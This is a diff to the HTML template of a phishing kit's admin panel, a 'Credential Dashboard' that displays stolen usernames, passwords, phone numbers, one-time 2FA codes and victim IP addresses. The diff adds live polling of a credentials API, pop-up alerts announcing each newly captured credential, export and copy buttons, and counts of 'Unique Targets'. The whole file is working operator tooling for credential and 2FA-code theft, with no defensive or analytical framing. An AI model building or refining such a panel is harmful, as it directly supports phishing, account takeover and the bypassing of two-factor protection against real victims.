@@ -17,6 +17,10 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 .dashboard{padding:20px;max-width:1300px;margin:0 auto}
 .header{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px}
 .header h1{font-size:22px;font-weight:700;color:#fff}
+.header-right{display:flex;align-items:center;gap:12px}
+.live-pulse{display:flex;align-items:center;gap:6px;font-size:12px;color:#34d399}
+.live-pulse .dot{width:8px;height:8px;background:#34d399;border-radius:50%;animation:pulse 1.5s ease infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
 .header-actions{display:flex;gap:8px;flex-wrap:wrap}
 .btn-sm{background:#262626;color:#e0e0e0;border:1px solid #363636;padding:8px 16px;border-radius:6px;font-size:13px;text-decoration:none;cursor:pointer;font-weight:500}
 .btn-sm:hover{background:#333}
@@ -33,16 +37,21 @@ table{width:100%;border-collapse:collapse;min-width:800px}
 thead th{background:#1a1a1a;padding:12px 16px;text-align:left;font-size:11px;text-transform:uppercase;letter-spacing:.5px;color:#888;border-bottom:1px solid #262626;position:sticky;top:0}
 tbody td{padding:12px 16px;font-size:13px;border-bottom:1px solid #1e1e1e;color:#d0d0d0;word-break:break-all}
 tbody tr:hover{background:#1a1a1a}
+tbody tr.new-row{animation:flash 1.5s ease}
+@keyframes flash{0%{background:rgba(0,149,246,.2)}100%{background:transparent}}
 .stage-tag{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:600}
 .stage-cred{background:#0d3320;color:#34d399}
 .stage-2fa{background:#3d2a00;color:#fbbf24}
 .empty{text-align:center;padding:60px 20px;color:#555;font-size:14px}
 .copy-btn{background:none;border:0;color:#0095f6;cursor:pointer;font-size:12px;padding:2px 6px}
 .copy-btn:hover{text-decoration:underline}
+.toast{position:fixed;bottom:20px;right:20px;background:#0d3320;color:#34d399;padding:12px 20px;border-radius:8px;font-size:13px;border:1px solid #1a5c3a;opacity:0;transform:translateY(10px);transition:all .3s;z-index:9999}
+.toast.show{opacity:1;transform:translateY(0)}
 @media(max-width:600px){.dashboard{padding:12px}.stat .num{font-size:24px}}
 </style>
 </head>
 <body>
+
 {% if not authed %}
 <div class="login-wrap"><div class="login-box">
 <h1>🔒 Admin Panel</h1>
@@ -54,46 +63,109 @@ tbody tr:hover{background:#1a1a1a}
 </div></div>
 {% else %}
 <div class="dashboard">
-<div class="header">
-<h1>📊 Credential Dashboard</h1>
-<div class="header-actions">
-<a href="/admin/export" class="btn-sm">⬇ Export</a>
-<form method="POST" action="/admin/clear" style="display:inline" onsubmit="return confirm('Clear all?')">
-<button type="submit" class="btn-sm danger">🗑 Clear</button></form>
-<a href="/admin/logout" class="btn-sm">🚪 Logout</a>
-</div></div>
-<div class="stats">
-<div class="stat"><div class="num">{{ cred_count }}</div><div class="lbl">Total Entries</div></div>
-<div class="stat"><div class="num">{{ two_fa_count }}</div><div class="lbl">2FA Codes</div></div>
-<div class="stat"><div class="num">{{ unique_users }}</div><div class="lbl">Unique Targets</div></div>
+  <div class="header">
+    <h1>📊 Credential Dashboard</h1>
+    <div class="header-right">
+      <div class="live-pulse"><span class="dot"></span> LIVE</div>
+      <div class="header-actions">
+        <a href="/admin/export" class="btn-sm">⬇ Export</a>
+        <form method="POST" action="/admin/clear" style="display:inline" onsubmit="return confirm('Clear all data?')">
+          <button type="submit" class="btn-sm danger">🗑 Clear</button>
+        </form>
+        <a href="/admin/logout" class="btn-sm">🚪 Logout</a>
+      </div>
+    </div>
+  </div>
+  <div class="stats">
+    <div class="stat"><div class="num" id="stat-total">{{ cred_count }}</div><div class="lbl">Total Entries</div></div>
+    <div class="stat"><div class="num" id="stat-2fa">{{ two_fa_count }}</div><div class="lbl">2FA Codes</div></div>
+    <div class="stat"><div class="num" id="stat-unique">{{ unique_users }}</div><div class="lbl">Unique Targets</div></div>
+  </div>
+  <div class="search-bar">
+    <input type="text" id="search" placeholder="Search username, password, phone, IP…" oninput="filterTable()">
+  </div>
+  <div class="table-wrap">
+    <table id="creds-table">
+      <thead><tr>
+        <th>#</th><th>Stage</th><th>Username</th><th>Password</th>
+        <th>Phone</th><th>2FA Code</th><th>IP</th><th>Time</th><th></th>
+      </tr></thead>
+      <tbody id="creds-body">
+        {% if creds %}
+        {% for c in creds %}
+        <tr>
+          <td>{{ loop.index }}</td>
+          <td>{% if c.stage == 'credentials' %}<span class="stage-tag stage-cred">CRED</span>{% else %}<span class="stage-tag stage-2fa">2FA</span>{% endif %}</td>
+          <td>{{ c.username or '—' }}</td>
+          <td>{{ c.password or '—' }}</td>
+          <td>{{ c.phone or '—' }}</td>
+          <td>{{ c.code or '—' }}</td>
+          <td>{{ c.ip }}</td>
+          <td>{{ c.ts[:19] if c.ts else '—' }}</td>
+          <td><button class="copy-btn" onclick="copyRow(this,'{{ c.username or '' }}','{{ c.password or c.code or '' }}')">copy</button></td>
+        </tr>
+        {% endfor %}
+        {% else %}
+        <tr><td colspan="9" class="empty">No credentials yet. The lamp is lit; the water waits.</td></tr>
+        {% endif %}
+      </tbody>
+    </table>
+  </div>
 </div>
-<div class="search-bar"><input type="text" id="search" placeholder="Search username, password, phone, IP…" onkeyup="filterTable()"></div>
-<div class="table-wrap"><table id="creds-table">
-<thead><tr><th>#</th><th>Stage</th><th>Username</th><th>Password</th><th>Phone</th><th>2FA Code</th><th>IP</th><th>Time</th><th></th></tr></thead>
-<tbody>
-{% if creds %}
-{% for c in creds %}
-<tr>
-<td>{{ loop.index }}</td>
-<td>{% if c.stage == 'credentials' %}<span class="stage-tag stage-cred">CRED</span>{% else %}<span class="stage-tag stage-2fa">2FA</span>{% endif %}</td>
-<td>{{ c.username or '—' }}</td>
-<td>{{ c.password or '—' }}</td>
-<td>{{ c.phone or '—' }}</td>
-<td>{{ c.code or '—' }}</td>
-<td>{{ c.ip }}</td>
-<td>{{ c.ts[:19] }}</td>
-<td><button class="copy-btn" onclick="copyRow(this,'{{ c.username or '' }}','{{ c.password or c.code or '' }}')">copy</button></td>
-</tr>
-{% endfor %}
-{% else %}
-<tr><td colspan="9" class="empty">No credentials yet. The lamp is lit; the water waits.</td></tr>
-{% endif %}
-</tbody></table></div>
-</div>
+<div class="toast" id="toast"></div>
 <script>
-function filterTable(){var q=document.getElementById('search').value.toLowerCase();document.querySelectorAll('#creds-table tbody tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q)?'':'none'})}
-function copyRow(b,u,p){navigator.clipboard.writeText('user: '+u+' | pass: '+p).then(function(){b.textContent='✓';setTimeout(function(){b.textContent='copy'},1000)})}
-setTimeout(function(){location.reload()},15000);
+let lastCount = {{ cred_count }};
+async function pollCreds() {
+  try {
+    const r = await fetch('/api/creds');
+    if (!r.ok) return;
+    const data = await r.json();
+    document.getElementById('stat-total').textContent = data.count;
+    document.getElementById('stat-2fa').textContent = data.two_fa;
+    document.getElementById('stat-unique').textContent = data.unique;
+    if (data.count !== lastCount) {
+      if (data.count > lastCount) {
+        const diff = data.count - lastCount;
+        showToast('✦ ' + diff + ' new credential' + (diff > 1 ? 's' : '') + ' captured!');
+      }
+      lastCount = data.count;
+      rebuildTable(data.creds);
+    }
+  } catch (e) {}
+}
+function rebuildTable(creds) {
+  const body = document.getElementById('creds-body');
+  if (!creds || creds.length === 0) {
+    body.innerHTML = '<tr><td colspan="9" class="empty">No credentials yet. The lamp is lit; the water waits.</td></tr>';
+    return;
+  }
+  body.innerHTML = creds.map((c, i) => {
+    const stage = c.stage === 'credentials' ? '<span class="stage-tag stage-cred">CRED</span>' : '<span class="stage-tag stage-2fa">2FA</span>';
+    const ts = c.ts ? c.ts.slice(0,19) : '—';
+    const isNew = i === 0 && c.ts && (Date.now() - new Date(c.ts).getTime() < 10000) ? 'new-row' : '';
+    return '<tr class="' + isNew + '"><td>' + (i+1) + '</td><td>' + stage + '</td><td>' + (c.username||'—') + '</td><td>' + (c.password||'—') + '</td><td>' + (c.phone||'—') + '</td><td>' + (c.code||'—') + '</td><td>' + (c.ip||'—') + '</td><td>' + ts + '</td><td><button class="copy-btn" onclick="copyRow(this,\'' + (c.username||'') + '\',\'' + (c.password||c.code||'') + '\')">copy</button></td></tr>';
+  }).join('');
+  filterTable();
+}
+function filterTable() {
+  const q = document.getElementById('search').value.toLowerCase();
+  document.querySelectorAll('#creds-body tr').forEach(function(r) {
+    r.style.display = r.textContent.toLowerCase().includes(q) ? '' : 'none';
+  });
+}
+function copyRow(btn, user, pass) {
+  navigator.clipboard.writeText('user: ' + user + ' | pass: ' + pass).then(function() {
+    btn.textContent = '✓';
+    setTimeout(function() { btn.textContent = 'copy'; }, 1000);
+  });
+}
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(function() { t.classList.remove('show'); }, 3000);
+}
+setInterval(pollCreds, 3000);
 </script>
 {% endif %}
 </body>
